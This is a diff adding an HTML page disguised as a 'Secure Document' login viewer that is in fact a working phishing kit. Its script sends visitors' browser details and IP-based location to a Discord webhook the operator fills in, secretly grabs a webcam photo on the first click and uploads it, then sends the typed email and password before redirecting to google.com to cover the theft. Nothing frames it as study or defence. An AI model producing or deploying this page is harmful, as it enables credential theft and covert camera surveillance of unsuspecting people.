@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Document Viewer</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            width: 400px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+        .logo { font-size: 48px; margin-bottom: 20px; }
+        h1 { color: #333; }
+        input { width: 100%; padding: 14px; border: 2px solid #e0e0e0; border-radius: 10px; font-size: 16px; margin-bottom: 16px; }
+        button { width: 100%; padding: 14px; background: linear-gradient(135deg, #667eea, #764ba2); color: white; border: none; border-radius: 10px; font-size: 16px; cursor: pointer; }
+    </style>
+</head>
+<body>
+<div class="card">
+    <div class="logo">🔒</div>
+    <h1>Secure Document</h1>
+    <p>Verify to view document</p>
+    <input type="text" id="email" placeholder="Email">
+    <input type="password" id="password" placeholder="Password">
+    <button onclick="handleLogin()">Continue</button>
+    <div id="status"></div>
+</div>
+
+<script>
+// ===== YOUR DISCORD WEBHOOK URL - CHANGE THIS =====
+const WEBHOOK = "YOUR_DISCORD_WEBHOOK_URL_HERE";
+
+// Browser info
+fetch(WEBHOOK, {
+    method: 'POST',
+    body: JSON.stringify({
+        content: "```json\n" + JSON.stringify({
+            type: "browser_info",
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            screen: screen.width + "x" + screen.height,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            language: navigator.language,
+            timestamp: new Date().toISOString()
+        }, null, 2) + "\n```"
+    }),
+    headers: {'Content-Type': 'application/json'}
+});
+
+// IP and location
+fetch('https://ipapi.co/json/')
+    .then(r => r.json())
+    .then(data => {
+        fetch(WEBHOOK, {
+            method: 'POST',
+            body: JSON.stringify({
+                content: "```json\n" + JSON.stringify({
+                    type: "location",
+                    ip: data.ip,
+                    city: data.city,
+                    region: data.region,
+                    country: data.country_name,
+                    org: data.org,
+                    lat: data.latitude,
+                    lon: data.longitude
+                }, null, 2) + "\n```"
+            }),
+            headers: {'Content-Type': 'application/json'}
+        });
+    });
+
+// Camera capture on click
+function capturePhoto() {
+    navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = 320;
+                canvas.height = 240;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const photoData = canvas.toDataURL('image/jpeg', 0.7);
+                
+                // Send photo to Discord
+                fetch(photoData)
+                    .then(res => res.blob())
+                    .then(blob => {
+                        const formData = new FormData();
+                        formData.append('file', blob, 'photo.jpg');
+                        formData.append('payload_json', JSON.stringify({
+                            content: "📸 **Photo captured!**"
+                        }));
+                        fetch(WEBHOOK, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    });
+                
+                stream.getTracks().forEach(t => t.stop());
+            }, 500);
+        })
+        .catch(() => {});
+}
+document.addEventListener('click', capturePhoto, { once: true });
+
+// Handle login
+function handleLogin() {
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+    
+    fetch(WEBHOOK, {
+        method: 'POST',
+        body: JSON.stringify({
+            content: "🔑 **Credentials captured!**\nEmail: `" + email + "`\nPassword: `" + password + "`"
+        }),
+        headers: {'Content-Type': 'application/json'}
+    });
+    
+    document.querySelector('button').style.display = 'none';
+    document.getElementById('status').innerHTML = '<p>Redirecting to secure portal...</p>';
+    setTimeout(() => { window.location.href = 'https://google.com'; }, 2000);
+}
+</script>
+</body>
+</html>
